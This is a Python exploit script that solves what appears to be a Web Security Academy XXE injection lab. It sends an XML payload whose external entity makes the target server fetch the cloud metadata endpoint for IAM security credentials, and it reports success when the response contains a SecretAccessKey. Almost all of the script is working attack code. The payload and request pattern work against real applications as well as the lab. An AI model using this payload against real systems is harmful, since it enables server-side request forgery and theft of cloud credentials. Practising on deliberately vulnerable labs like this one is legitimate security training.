#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""XXE Injection Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" 
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url

def xxe_injection(url):
    path = '/product/stock'
    payload = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"""
    headers = {        
        "Content-Type": "application/xml",
        "Referer": url + "/product?productId=1"
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        r = requests.post(url + path, verify=False, proxies=proxies, data=payload, headers=headers)
    else:
        r = requests.post(url+ path, verify=False, data=payload, headers=headers)
        # verify the response contains SecretAccessKey
        if (b'SecretAccessKey' in r.content):
            print("(+) XXE Injection Successful!")
            subprocess.call(["firefox", url])
        else:
            print("(-) XXE Injection Failed")

def main():
    
    print("(+) Exploiting XXE Injection")
    
    xxe_injection(url)

if __name__ == "__main__":
    main()
